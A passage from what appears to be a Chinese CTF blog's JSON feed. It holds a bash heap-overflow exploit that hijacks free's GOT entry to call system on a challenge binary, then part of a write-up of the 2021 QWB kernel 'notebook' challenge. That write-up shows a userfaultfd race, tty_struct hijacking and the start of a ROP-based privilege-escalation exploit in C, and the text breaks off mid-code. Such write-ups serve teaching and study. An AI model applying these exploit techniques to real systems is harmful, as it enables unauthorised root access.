class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> pipefd[<span class=\"number\">2</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pipe(pipefd) == <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;pipe&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">stbuf</span>;</span></span><br><span class=\"line\">\tfstat(pipefd[<span class=\"number\">0</span>], &amp;stbuf);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, stbuf.st_size);<span class=\"comment\">// 0</span></span><br><span class=\"line\">\tfstat(pipefd[<span class=\"number\">1</span>], &amp;stbuf);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, stbuf.st_size);<span class=\"comment\">// 0</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"exp-3\"><a class=\"markdownIt-Anchor\" href=\"#exp-3\">#</a> exp</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">path=`pwd` # TODO: modify here</span><br><span class=\"line\">target=$path/crc32sum</span><br><span class=\"line\">./cleanup.sh</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">real size xx</span></span><br><span class=\"line\">A1=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class=\"line\">A2=ooooooooooooooooooooooooooooooo</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">real szie 0x40</span></span><br><span class=\"line\">B=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class=\"line\">C=kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">real szie 0x40</span></span><br><span class=\"line\">PL=ccccccccccccccccccccccccccccccccccccccccccccccc</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">real szie 0x50</span></span><br><span class=\"line\">PIPE=pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">tmp=`<span class=\"built_in\">mktemp</span> /tmp/cake-XXX`</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">cp</span> <span class=\"variable\">$target</span> .</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">:&lt;&lt;<span class=\"string\">eof</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tchunk[0x30] &lt;&lt;- A&#x27;s name</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tchunk[0x20] &lt;&lt;- A&#x27;s content    &lt;&lt;- overflow</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tchunk[0x40] &lt;&lt;- B</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tchunk[0x40] &lt;&lt;- B</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">eof</span></span></span><br><span class=\"line\">python3 -c &quot;print(&#x27;C&#x27;*0x1f)&quot; &gt; $A1</span><br><span class=\"line\">python3 -c &quot;print(&#x27;C&#x27;*0xf)&quot;  &gt; $A2</span><br><span class=\"line\">python3 -c &quot;print(&#x27;C&#x27;*0x2f)&quot; &gt; $B # B creat two of 0x40 real size chunk</span><br><span class=\"line\">python3 -c &quot;print(&#x27;C&#x27;*0x2f)&quot; &gt; $C</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">:&lt;&lt;<span class=\"string\">eof</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tGOT\t\t\t\t\t\t\t SYM                 PLT</span></span>\t\t\t\t</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404018 free@GLIBC_2.2.5    0000000000401030</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404020 puts@GLIBC_2.2.5    0000000000401040</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404028 system@GLIBC_2.2.5  0000000000401050</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404030 printf@GLIBC_2.2.5  0000000000401060</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404038 geteuid@GLIBC_2.2.5 0000000000401070</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404040 close@GLIBC_2.2.5   0000000000401080</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">eof</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">hijack free<span class=\"string\">&#x27;s got to system&#x27;</span>s plt and retain other nothing change</span></span><br><span class=\"line\">echo -ne &quot;\\x50\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x40\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x50\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x60\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x70\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x80\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\"></span><br><span class=\"line\">python3 -c &quot;print(&#x27;S&#x27;*0x18,end=&#x27;&#x27;)&quot;          &gt; payload</span><br><span class=\"line\">echo -ne &#x27;\\x41\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27; &gt;&gt; payload</span><br><span class=\"line\">echo -ne &#x27;\\x18\\x40\\x40\\x00\\x00\\x00\\x00\\x00&#x27; &gt;&gt; payload</span><br><span class=\"line\">echo &quot;cat ~/flag&quot; &gt; cmd</span><br><span class=\"line\">mkfifo $PIPE</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">A1是发现会凭空出现一个0x400的块 间隔我们的payload</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">gdb -x gdbscript --args <span class=\"variable\">$target</span> <span class=\"variable\">$A1</span> <span class=\"variable\">$A2</span> <span class=\"variable\">$B</span> <span class=\"variable\">$PIPE</span> <span class=\"variable\">$PL</span> cmd</span> </span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">target <span class=\"variable\">$A1</span> <span class=\"variable\">$A2</span> <span class=\"variable\">$B</span> <span class=\"variable\">$PIPE</span> <span class=\"variable\">$PL</span> cmd  &amp;</span></span><br><span class=\"line\">sleep 1</span><br><span class=\"line\">cat ./payload &gt; $PIPE</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux",
                "writeup"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/09/11/kernel-notebook-three-solutions/",
            "url": "https://squirre17.github.io/2022/09/11/kernel-notebook-three-solutions/",
            "title": "kernel-notebook-three-solutions",
            "date_published": "2022-09-11T02:28:41.000Z",
            "content_html": "<h1 id=\"notebook的多种解法\"><a class=\"markdownIt-Anchor\" href=\"#notebook的多种解法\">#</a> notebook 的多种解法</h1>\n<p>2021 QWB</p>\n<p>这个题就是考锁没加好的多线程条件竞争</p>\n<h2 id=\"传统rop-ptmx\"><a class=\"markdownIt-Anchor\" href=\"#传统rop-ptmx\">#</a> 传统 ROP -ptmx</h2>\n<p>利用 realloc 指针延迟回写的效果 将 free 的块回写回控制区</p>\n<p>造成对 tty struct 结构体的控制</p>\n<p>然后泄漏 kernel base</p>\n<p>并两段栈迁移 (测试过 一段迁移不行 会卡在一个地方)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">noteedit</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> newsize, <span class=\"type\">void</span> *buf)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// r13</span></span><br><span class=\"line\">  note *v5; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// r12</span></span><br><span class=\"line\">  __int64 v8; <span class=\"comment\">// rbx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  (···)</span><br><span class=\"line\">  </span><br><span class=\"line\">  v4 = v3;</span><br><span class=\"line\">  v5 = &amp;notebook[idx];</span><br><span class=\"line\">  raw_read_lock(&amp;lock);                      [<span class=\"number\">1</span>] &lt;&lt;- 加了读锁</span><br><span class=\"line\">  size = v5-&gt;size;<span class=\"comment\">// size是原size</span></span><br><span class=\"line\">  v5-&gt;size = newsize;<span class=\"comment\">// 立刻改成了我们输入的新size</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size == newsize )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v8 = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> editout;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 这里会把notefree 却没立刻置空</span></span><br><span class=\"line\">  v7 = (*(__int64 (__fastcall **)(<span class=\"type\">void</span> *, <span class=\"type\">size_t</span>, __int64))krealloc.gap0)(v5-&gt;note, newsize, <span class=\"number\">37748928LL</span>);</span><br><span class=\"line\">  copy_from_user(name, v4, <span class=\"number\">256LL</span>);           [<span class=\"number\">2</span>] &lt;&lt;- 这里可以uffd</span><br><span class=\"line\">  <span class=\"title function_\">if</span> <span class=\"params\">( !v5-&gt;size )</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printk(<span class=\"string\">&quot;free in fact&quot;</span>);</span><br><span class=\"line\">    v5-&gt;note = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    v8 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> editout;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)_virt_addr_valid(v7) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5-&gt;note = (<span class=\"type\">void</span> *)v7;                   [<span class=\"number\">3</span>] &lt;&lt;- 这里写回note</span><br><span class=\"line\">    v8 = <span class=\"number\">2LL</span>;</span><br><span class=\"line\">editout:</span><br><span class=\"line\">    raw_read_unlock(&amp;lock);</span><br><span class=\"line\">    printk(<span class=\"string\">&quot;[o] Edit success. %s edit a note.\\n&quot;</span>, name);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> v8;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  printk(<span class=\"string\">&quot;[x] Return ptr unvalid.\\n&quot;</span>);</span><br><span class=\"line\">  raw_read_unlock(&amp;lock);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">3LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/09/11/kernel-notebook-three-solutions/1.png\" alt=\"Pasted image 20220910152111\"></p>\n<p>exp</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;include/head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 1024</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint64_t</span> u64;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint32_t</span> u32;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> uffd, note_fd;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> mod_base_addr, cookie ,kernel_base_addr;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> fault_page, fault_page_len;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> target, modprobe_path;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> errExit(msg) &#123; \\</span></span><br><span class=\"line\"><span class=\"meta\">\tperror(msg);       \\</span></span><br><span class=\"line\"><span class=\"meta\">\texit(1);\t\t   \\</span></span><br><span class=\"line\"><span class=\"meta\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> idx;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> size;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> buf;</span><br><span class=\"line\">&#125;userarg;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_ELEM 0x100</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">enum</span>&#123;</span> </span><br><span class=\"line\">\tSWAPGS_POP_RET, IRETQ, COMMIT_CREDS,</span><br><span class=\"line\">\tPREPARE_KERNEL_CRED, </span><br><span class=\"line\">\tSUB_RSP_RET ,PUSH_RDI_POP_RSP_POP_RET,</span><br><span class=\"line\">\tPOP_RDI ,POP_RSP,</span><br><span class=\"line\">\tMOV_RDI_RAX_POP_RET,</span><br><span class=\"line\">\tTERMINATOR</span><br><span class=\"line\">&#125;;<span class=\"comment\">//PREPARE_KERNEL_CRED, COMMIT_CREDS, &#125;;</span></span><br><span class=\"line\">u64 a[MAX_ELEM];</span><br><span class=\"line\"><span class=\"comment\">//tty_struct结构体的大小</span></span><br><span class=\"line\"><span 